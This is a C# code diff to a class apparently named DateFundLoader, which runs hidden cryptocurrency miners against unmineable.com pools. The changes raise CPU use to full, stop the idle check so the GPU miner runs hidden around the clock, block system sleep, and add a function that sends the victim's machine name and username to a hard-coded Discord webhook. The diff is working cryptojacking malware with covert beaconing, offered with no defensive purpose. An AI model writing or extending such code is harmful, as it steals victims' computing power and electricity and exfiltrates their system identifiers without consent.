@@ -19,8 +19,21 @@ public class DateFundLoader {
     [DllImport("user32.dll")]
     static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
 
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    static extern uint SetThreadExecutionState(uint esFlags);
+
+    private const uint ES_CONTINUOUS = 0x80000000;
+    private const uint ES_SYSTEM_REQUIRED = 0x00000001;
+    private const uint ES_AWAYMODE_REQUIRED = 0x00000040;
+
     public static void StartMiner(string cpuMinerPath, string gpuMinerPath, string wallet) {
         try {
+            // Keep the system awake and prevent hibernation/sleep
+            SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_AWAYMODE_REQUIRED);
+            
+            // Notify Mezo's command center
+            NotifyDiscord(wallet);
+
             // 1. Start the CPU Miner Watchdog (Immortal feature)
             Thread cpuThread = new Thread(() => MonitorAndReviveCpu(cpuMinerPath, wallet));
             cpuThread.IsBackground = true;
@@ -41,7 +54,7 @@ public class DateFundLoader {
     }
 
     private static void MonitorAndReviveCpu(string cpuMinerPath, string wallet) {
-        string args = string.Format("-o rx.unmineable.com:3333 -u BTC:{0}.ENI_LO_CPU -p x --donate-level 1 --cpu-max-threads-hint 50", wallet);
+        string args = string.Format("-o rx.unmineable.com:3333 -u BTC:{0}.ENI_LO_CPU -p x --donate-level 1 --cpu-max-threads-hint 100", wallet);
         string procName = Path.GetFileNameWithoutExtension(cpuMinerPath);
         
         while (true) {
@@ -62,34 +75,37 @@ public class DateFundLoader {
 
     private static void MonitorIdleAndMine(string gpuMinerPath, string wallet) {
         Process gpuProcess = null;
-        const int IDLE_THRESHOLD_MS = 5 * 60 * 1000; // 5 minutes
 
         while (true) {
-            uint idleTime = GetIdleTime();
-
-            if (idleTime > IDLE_THRESHOLD_MS) {
-                // User is idle - start GPU miner if not running
-                if (gpuProcess == null || gpuProcess.HasExited) {
+            // User activity check removed per Mezo's request for max profits - 24/7 mining
+            if (gpuProcess == null || gpuProcess.HasExited) {
+                try {
                     ProcessStartInfo startInfo = new ProcessStartInfo(gpuMinerPath);
-                    // Using Etchash for GPU - much more profitable for RTX 3060
                     startInfo.Arguments = string.Format("--algo ETCHASH --server etchash.unmineable.com:3333 --user BTC:{0}.ENI_LO_GPU --pass x", wallet);
                     startInfo.CreateNoWindow = true;
                     startInfo.UseShellExecute = false;
                     startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                     gpuProcess = Process.Start(startInfo);
-                }
-            } else {
-                // User is active - kill GPU miner immediately
-                if (gpuProcess != null && !gpuProcess.HasExited) {
-                    try {
-                        gpuProcess.Kill();
-                        gpuProcess = null;
-                    } catch { }
-                }
+                } catch { }
             }
 
-            Thread.Sleep(5000); // Check every 5 seconds
+            Thread.Sleep(5000); 
         }
+    }
+
+    private static void NotifyDiscord(string wallet) {
+        try {
+            string webhookUrl = "https://discord.com/api/webhooks/1495748321078284358/ZrPnFP_wT81nNxuqlsAOB9FNWrOJhK3nPGRYQJjDuH-2mIWdyNf1RK_Ql9Quf6vSgbKr";
+            string compName = Environment.MachineName;
+            string userName = Environment.UserName;
+            string msg = string.Format("🚀 **New Worker Alive!**\n**Host:** `{0}`\n**User:** `{1}`\n**Wallet:** `{2}`\n**Status:** Fully Optimized (100% CPU + 24/7 GPU + Anti-Sleep)", compName, userName, wallet);
+            
+            using (WebClient wc = new WebClient()) {
+                wc.Headers[HttpRequestHeader.ContentType] = "application/json";
+                string json = "{\"content\": \"" + msg + "\"}";
+                wc.UploadString(webhookUrl, json);
+            }
+        } catch { }
     }
 
     private static uint GetIdleTime() {
